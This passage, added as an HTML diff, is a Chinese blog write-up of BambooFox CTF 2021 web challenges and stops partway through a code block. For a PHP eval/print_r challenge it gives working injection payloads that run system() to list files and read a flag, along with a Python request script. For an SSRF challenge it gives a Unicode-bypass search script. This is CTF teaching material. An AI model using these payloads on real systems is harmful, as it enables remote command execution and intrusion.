@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言最近没事找找题做，发现有趣的东西记录一下。 0x01 ヽ(#`Д´)ﾉ题目源码如下：12345&amp;lt;?=highlight_file(__FILE__) &amp;amp;&amp;amp;strlen($🐱 = $_GET[&apos;ヽ(#`Д´)ﾉ&apos;]) &amp;lt; 0x0A &amp;amp;&amp;amp;!preg_match(&apos;/[a-z0-9`]/i&apos;, $🐱) &amp;amp;&amp;amp;eval(print_r($�">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BambooFox CTF 2021部分web题总结">
+<meta property="og:url" content="http://yoursite.com/2021/02/01/BambooFox-CTF-2021部分web题总结/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言最近没事找找题做，发现有趣的东西记录一下。 0x01 ヽ(#`Д´)ﾉ题目源码如下：12345&amp;lt;?=highlight_file(__FILE__) &amp;amp;&amp;amp;strlen($🐱 = $_GET[&apos;ヽ(#`Д´)ﾉ&apos;]) &amp;lt; 0x0A &amp;amp;&amp;amp;!preg_match(&apos;/[a-z0-9`]/i&apos;, $🐱) &amp;amp;&amp;amp;eval(print_r($�">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-29-BambooFox-CTF-2021-1.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-29-BambooFox-CTF-2021-2.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-29-BambooFox-CTF-2021-3.PNG">
+<meta property="og:updated_time" content="2021-02-01T08:52:06.745Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BambooFox CTF 2021部分web题总结">
+<meta name="twitter:description" content="前言最近没事找找题做，发现有趣的东西记录一下。 0x01 ヽ(#`Д´)ﾉ题目源码如下：12345&amp;lt;?=highlight_file(__FILE__) &amp;amp;&amp;amp;strlen($🐱 = $_GET[&apos;ヽ(#`Д´)ﾉ&apos;]) &amp;lt; 0x0A &amp;amp;&amp;amp;!preg_match(&apos;/[a-z0-9`]/i&apos;, $🐱) &amp;amp;&amp;amp;eval(print_r($�">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-29-BambooFox-CTF-2021-1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/02/01/BambooFox-CTF-2021部分web题总结/">
+
+
+
+
+
+  <title>BambooFox CTF 2021部分web题总结 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/01/BambooFox-CTF-2021部分web题总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BambooFox CTF 2021部分web题总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-02-01T16:50:16+08:00">
+                2021-02-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  11
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近没事找找题做，发现有趣的东西记录一下。</p>
+<h4 id="0x01-ヽ-Д´-ﾉ"><a href="#0x01-ヽ-Д´-ﾉ" class="headerlink" title="0x01 ヽ(#`Д´)ﾉ"></a>0x01 ヽ(#`Д´)ﾉ</h4><h6 id="题目源码如下："><a href="#题目源码如下：" class="headerlink" title="题目源码如下："></a>题目源码如下：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>) &amp;&amp;</span><br><span class="line">strlen($🐱 = $_GET[<span class="string">'ヽ(#`Д´)ﾉ'</span>]) &lt; <span class="number">0x0A</span> &amp;&amp;</span><br><span class="line">!preg_match(<span class="string">'/[a-z0-9`]/i'</span>, $🐱) &amp;&amp;</span><br><span class="line"><span class="keyword">eval</span>(print_r($🐱, <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<h6 id="分析代码可知，我们的输入最终将在eval-中处理，将导致任意命令执行。"><a href="#分析代码可知，我们的输入最终将在eval-中处理，将导致任意命令执行。" class="headerlink" title="分析代码可知，我们的输入最终将在eval()中处理，将导致任意命令执行。"></a>分析代码可知，我们的输入最终将在<code>eval()</code>中处理，将导致任意命令执行。</h6><h6 id="接下来我们需要关注三个点："><a href="#接下来我们需要关注三个点：" class="headerlink" title="接下来我们需要关注三个点："></a>接下来我们需要关注三个点：</h6><ul>
+<li>输入的长度不能超过<code>10</code>字节</li>
+<li>输入的字符不能包含<code>a-z0-9</code>和`</li>
+<li>输入的字符先被<code>print_r()</code>处理然后在传入到<code>eval()</code>中处理</li>
+</ul>
+<h6 id="我们可以把它理解成下面这个代码："><a href="#我们可以把它理解成下面这个代码：" class="headerlink" title="我们可以把它理解成下面这个代码："></a>我们可以把它理解成下面这个代码：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(strlen($code)&gt;=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"length to long"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[a-z0-9`]/'</span>,$code))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"characters is wrong"</span>);</span><br><span class="line"></span><br><span class="line">$result=print_r($code,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>($result);</span><br></pre></td></tr></table></figure>
+
+<h6 id="由于使用-GET-来获取参数，根据php的特性我们可以使用一个数组来绕过长度判断和正则表达式，例如："><a href="#由于使用-GET-来获取参数，根据php的特性我们可以使用一个数组来绕过长度判断和正则表达式，例如：" class="headerlink" title="由于使用$_GET[]来获取参数，根据php的特性我们可以使用一个数组来绕过长度判断和正则表达式，例如："></a>由于使用<code>$_GET[]</code>来获取参数，根据<code>php</code>的特性我们可以使用一个数组来绕过长度判断和正则表达式，例如：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code=[<span class="string">"system"</span>,<span class="string">"ls"</span>];</span><br></pre></td></tr></table></figure>
+
+<h6 id="在url构造如下："><a href="#在url构造如下：" class="headerlink" title="在url构造如下："></a>在<code>url</code>构造如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test/Test2/Test4.php?code[]=system&amp;code[]=ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-29-BambooFox-CTF-2021-1.PNG" alt></p>
+<h6 id="从上图可知构造一个数组的确可以绕过长度和正则表达式限制，但是不能通过eval-print-r-code-1-解析。"><a href="#从上图可知构造一个数组的确可以绕过长度和正则表达式限制，但是不能通过eval-print-r-code-1-解析。" class="headerlink" title="从上图可知构造一个数组的确可以绕过长度和正则表达式限制，但是不能通过eval(print_r($code,1))解析。"></a>从上图可知构造一个数组的确可以绕过长度和正则表达式限制，但是不能通过<code>eval(print_r($code,1))</code>解析。</h6><h6 id="类比exec-函数我们使用反问号它可以先执行反问号里面的内容，然后抛出错误。尝试在eval-中使用反问号，例如："><a href="#类比exec-函数我们使用反问号它可以先执行反问号里面的内容，然后抛出错误。尝试在eval-中使用反问号，例如：" class="headerlink" title="类比exec()函数我们使用反问号它可以先执行反问号里面的内容，然后抛出错误。尝试在eval()中使用反问号，例如："></a>类比<code>exec()</code>函数我们使用<code>反问号</code>它可以先执行<code>反问号</code>里面的内容，然后抛出错误。尝试在<code>eval()</code>中使用反问号，例如：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code=<span class="string">"ls `touch /tmp/test`; ls"</span>;</span><br><span class="line"><span class="keyword">eval</span>($code);</span><br></pre></td></tr></table></figure>
+
+<h6 id="但是显然不成功！"><a href="#但是显然不成功！" class="headerlink" title="但是显然不成功！"></a>但是显然不成功！</h6><h6 id="在eval-中注入字符串，来执行shell命令。"><a href="#在eval-中注入字符串，来执行shell命令。" class="headerlink" title="在eval()中注入字符串，来执行shell命令。"></a>在<code>eval()</code>中注入字符串，来执行shell命令。</h6><h6 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code = [<span class="string">"foo"</span>, <span class="string">"bar\n    [2] =&gt; hax\n);/*"</span>];</span><br><span class="line">print_r($code);</span><br></pre></td></tr></table></figure>
+
+<h6 id="输出如下："><a href="#输出如下：" class="headerlink" title="输出如下："></a>输出如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; &quot;foo&quot;,</span><br><span class="line">    [1] =&gt; &quot;bar&quot;,</span><br><span class="line">    [2] =&gt; &quot;hax&quot;</span><br><span class="line">);/*</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h6 id="PS-上面的-后面的内容全部被注释掉"><a href="#PS-上面的-后面的内容全部被注释掉" class="headerlink" title="PS:上面的/*后面的内容全部被注释掉"></a>PS:上面的<code>/*</code>后面的内容全部被注释掉</h6><h6 id="我们构造出payload如下："><a href="#我们构造出payload如下：" class="headerlink" title="我们构造出payload如下："></a>我们构造出payload如下：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$code = [<span class="string">"foo"</span>, <span class="string">"bar\n    [2] =&gt; hax\n);\necho system('ls -al');/*"</span>];</span><br><span class="line">print_r($code);</span><br></pre></td></tr></table></figure>
+
+<h6 id="输出如下：-1"><a href="#输出如下：-1" class="headerlink" title="输出如下："></a>输出如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; &quot;foo&quot;,</span><br><span class="line">    [1] =&gt; &quot;bar&quot;,</span><br><span class="line">    [2] =&gt; &quot;hax&quot;</span><br><span class="line">);</span><br><span class="line">echo system(&apos;ls -al&apos;);/*</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h6 id="由于Array-的键是错误的，因此上面的代码将不会执行。"><a href="#由于Array-的键是错误的，因此上面的代码将不会执行。" class="headerlink" title="由于Array()的键是错误的，因此上面的代码将不会执行。"></a>由于<code>Array()</code>的键是错误的，因此上面的代码将不会执行。</h6><h6 id="不过我们可以通过关联数组来构造合法的键值，例如："><a href="#不过我们可以通过关联数组来构造合法的键值，例如：" class="headerlink" title="不过我们可以通过关联数组来构造合法的键值，例如："></a>不过我们可以通过关联数组来构造合法的键值，例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/?code[foo]=bar</span><br></pre></td></tr></table></figure>
+
+<h6 id="输出如下：-2"><a href="#输出如下：-2" class="headerlink" title="输出如下："></a>输出如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [&quot;foo&quot;] =&gt; &quot;bar&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h6 id="虽然它将会解析错误，但是我们将键修改为-SYSTEM，将会解析成功。"><a href="#虽然它将会解析错误，但是我们将键修改为-SYSTEM，将会解析成功。" class="headerlink" title="虽然它将会解析错误，但是我们将键修改为$_SYSTEM，将会解析成功。"></a>虽然它将会解析错误，但是我们将键修改为<code>$_SYSTEM</code>，将会解析成功。</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code = [</span><br><span class="line">    <span class="string">"\$_SYSTEM"</span> =&gt; <span class="string">"bar\n);/*"</span></span><br><span class="line">];</span><br><span class="line">print_r($code);</span><br></pre></td></tr></table></figure>
+
+<h6 id="输出如下：-3"><a href="#输出如下：-3" class="headerlink" title="输出如下："></a>输出如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [&quot;$_SYSTEM&quot;] =&gt; &quot;bar&quot;</span><br><span class="line">);/*</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h6 id="上面的代码将不会解析出错。"><a href="#上面的代码将不会解析出错。" class="headerlink" title="上面的代码将不会解析出错。"></a>上面的代码将不会解析出错。</h6><h6 id="因此我们将会得出我们最后的payload："><a href="#因此我们将会得出我们最后的payload：" class="headerlink" title="因此我们将会得出我们最后的payload："></a>因此我们将会得出我们最后的payload：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code = [</span><br><span class="line">    <span class="string">"\$_SYSTEM"</span> =&gt; <span class="string">"foo\n);\n\$e=system('ls -al');/*"</span></span><br><span class="line">];</span><br><span class="line">print_r($code);</span><br></pre></td></tr></table></figure>
+
+<h6 id="输出如下：-4"><a href="#输出如下：-4" class="headerlink" title="输出如下："></a>输出如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [&quot;$_SYSTEM&quot;] =&gt; &quot;foo&quot;</span><br><span class="line">);</span><br><span class="line">$e=system(&apos;ls -al&apos;);/*</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h6 id="PS-php7-4是可以的其他版本没试成功，可以使用该条命令下载尝试sudo-apt-install-y-php7-4-php7-4-xdebug。"><a href="#PS-php7-4是可以的其他版本没试成功，可以使用该条命令下载尝试sudo-apt-install-y-php7-4-php7-4-xdebug。" class="headerlink" title="PS:php7.4是可以的其他版本没试成功，可以使用该条命令下载尝试sudo apt install -y php7.4 php7.4-xdebug。"></a>PS:<code>php7.4</code>是可以的其他版本没试成功，可以使用该条命令下载尝试<code>sudo apt install -y php7.4 php7.4-xdebug</code>。</h6><h6 id="最后的payload："><a href="#最后的payload：" class="headerlink" title="最后的payload："></a>最后的payload：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">hax = <span class="string">"http://chall.ctf.bamboofox.tw:9487/?%E3%83%BD%28%23%60%D0%94%C2%B4%29%EF%BE%89[$_SYSTEM]=foo\n);\n$e=system('cat /flag_de42537a7dd854f4ce27234a103d4362');/*"</span></span><br><span class="line">resp = requests.get(hax)</span><br><span class="line">print(resp.content.decode())</span><br></pre></td></tr></table></figure>
+
+<h5 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ヽ(%23`Д´)ﾉ[]=system(&apos;cat /flag_de42537a7dd854f4ce27234a103d4362&apos;))?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-SSRFrog"><a href="#0x02-SSRFrog" class="headerlink" title="0x02 SSRFrog"></a>0x02 SSRFrog</h4><h6 id="题目提示："><a href="#题目提示：" class="headerlink" title="题目提示："></a>题目提示：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG is on this server: http://the.c0o0o0l-fl444g.server.internal:80</span><br></pre></td></tr></table></figure>
+
+<h6 id="题目源码如下：-1"><a href="#题目源码如下：-1" class="headerlink" title="题目源码如下："></a>题目源码如下：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/source"</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> res.sendFile(__filename);</span><br><span class="line">&#125;)</span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; url &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (!url || <span class="keyword">typeof</span> url !== <span class="string">'string'</span>) <span class="keyword">return</span> res.sendFile(__dirname + <span class="string">"/index.html"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// no duplicate characters in `url`</span></span><br><span class="line">    <span class="keyword">if</span> (url.length !== <span class="keyword">new</span> <span class="built_in">Set</span>(url).size) <span class="keyword">return</span> res.sendFile(__dirname + <span class="string">"/frog.png"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        http.get(url, resp =&gt; &#123;</span><br><span class="line">            resp.setEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line">            resp.statusCode === <span class="number">200</span> ? resp.on(<span class="string">'data'</span>, data =&gt; res.send(data)) : res.send(<span class="string">":("</span>);</span><br><span class="line">        &#125;).on(<span class="string">'error'</span>, () =&gt; res.send(<span class="string">"WTF?"</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        res.send(<span class="string">"WTF?"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="string">'0.0.0.0'</span>);</span><br></pre></td></tr></table></figure>
+
+<h6 id="根据题目提示和源码我们的目标是利用ssrf访问上面提供的地址拿到flag。"><a href="#根据题目提示和源码我们的目标是利用ssrf访问上面提供的地址拿到flag。" class="headerlink" title="根据题目提示和源码我们的目标是利用ssrf访问上面提供的地址拿到flag。"></a>根据题目提示和源码我们的目标是利用<code>ssrf</code>访问上面提供的地址拿到flag。</h6><h5 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h5><ul>
+<li>如果输入的<code>url</code>参数不为<code>string</code>和不存在就会返回<code>/index.html</code>页面。</li>
+<li>如果输入的<code>url</code>参数的长度不等于经<code>new Set(url).size</code>处理后的长度将会返回<code>frog.png</code>图片。</li>
+<li>经<code>Set()</code>处理后的集合<code>key</code>是不重复的也就是里面没有重复的值。</li>
+</ul>
+<h5 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h5><h6 id="由于nodejs中的http模块是用new-URL来处理的，因此我们可以用Unicode编码来绕过。"><a href="#由于nodejs中的http模块是用new-URL来处理的，因此我们可以用Unicode编码来绕过。" class="headerlink" title="由于nodejs中的http模块是用new URL来处理的，因此我们可以用Unicode编码来绕过。"></a>由于nodejs中的<code>http</code>模块是用<code>new URL</code>来处理的，因此我们可以用<code>Unicode</code>编码来绕过。</h6><h6 id="示例如下："><a href="#示例如下：" class="headerlink" title="示例如下："></a>示例如下：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">slove</span>(<span class="params">targetCahr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> domainSet = <span class="keyword">new</span> <span class="built_in">Set</span>(targetCahr);</span><br><span class="line">    <span class="keyword">let</span> temp = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (c <span class="keyword">of</span> domainSet) &#123;</span><br><span class="line">        temp[c] = [];</span><br><span class="line">        <span class="keyword">let</span> targetHost = <span class="string">'fake'</span> + c + <span class="string">'.com'</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">32</span>; i &lt;= <span class="number">65535</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">let</span> candidateChar = <span class="built_in">String</span>.fromCharCode(i);</span><br><span class="line">            <span class="keyword">let</span> input = <span class="string">'http://fake'</span> + candidateChar + <span class="string">'.com'</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> url = <span class="keyword">new</span> URL(input);</span><br><span class="line">                <span class="keyword">if</span> (url.hostname === targetHost) &#123;</span><br><span class="line">                    temp[c].push(candidateChar)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 